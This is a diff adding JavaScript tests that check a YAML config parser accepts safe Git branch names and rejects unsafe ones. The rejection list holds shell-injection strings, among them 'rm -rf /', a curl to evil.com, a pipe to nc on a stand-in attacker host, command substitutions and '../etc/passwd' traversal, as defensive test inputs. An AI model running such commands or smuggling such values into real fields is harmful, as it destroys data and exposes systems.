@@ -404,6 +404,53 @@ describe("parseGroundControlYaml", () => {
     assert.ok(result.errors.some((e) => e.includes("workflow has unknown key")));
   });
 
+  it("accepts safe workflow.base_branch values", () => {
+    for (const branch of ["dev", "main", "develop", "release/v1.2.3", "feature_x", "v2.x", "topic/sub-topic"]) {
+      const yaml = `schema_version: 1\nproject: x\nworkflow:\n  base_branch: ${branch}\n`;
+      const result = parseGroundControlYaml(yaml);
+      assert.equal(result.ok, true, `expected '${branch}' to be accepted but got: ${JSON.stringify(result.errors)}`);
+      assert.equal(result.value.workflow.base_branch, branch);
+    }
+  });
+
+  it("rejects workflow.base_branch with shell metacharacters or unsafe ref shapes", () => {
+    // Each entry is a shell-injection or git-check-ref-format violation that
+    // would be unsafe to render into `gh issue develop --base ...` etc.
+    // YAML-quoted so values like `dev; rm -rf /` parse as a single scalar.
+    const cases = [
+      "'dev; rm -rf /'", // command separator
+      "'dev && curl evil.com'", // command chain
+      "'dev | nc evil 1337'", // pipe to attacker
+      "'dev$(whoami)'", // command substitution
+      "'dev`whoami`'", // backtick substitution
+      "'dev > /tmp/x'", // redirection
+      "'../etc/passwd'", // path traversal in ref
+      "'/dev'", // leading slash
+      "'dev/'", // trailing slash
+      "'.dev'", // leading dot
+      "'dev.'", // trailing dot
+      "'dev.lock'", // .lock suffix
+      "'feat..ure'", // double-dot
+      "'feat//ure'", // double-slash
+      "'dev space'", // whitespace
+      "'dev~1'", // ~ disallowed by git
+      "'dev:foo'", // : disallowed by git
+      "'dev*'", // * disallowed by git
+      "'dev?'", // ? disallowed by git
+      "'dev[1]'", // [ disallowed by git
+      "'dev\\foo'", // backslash
+    ];
+    for (const value of cases) {
+      const yaml = `schema_version: 1\nproject: x\nworkflow:\n  base_branch: ${value}\n`;
+      const result = parseGroundControlYaml(yaml);
+      assert.equal(result.ok, false, `expected ${value} to be rejected`);
+      assert.ok(
+        result.errors.some((e) => e.includes("base_branch") && e.includes("safe Git ref name")),
+        `expected base_branch validation error for ${value}, got: ${JSON.stringify(result.errors)}`,
+      );
+    }
+  });
+
   it("requires both sonarcloud fields when sonarcloud is set", () => {
     const yaml = "schema_version: 1\nproject: x\nsonarcloud:\n  project_key: foo\n";
     const result = parseGroundControlYaml(yaml);
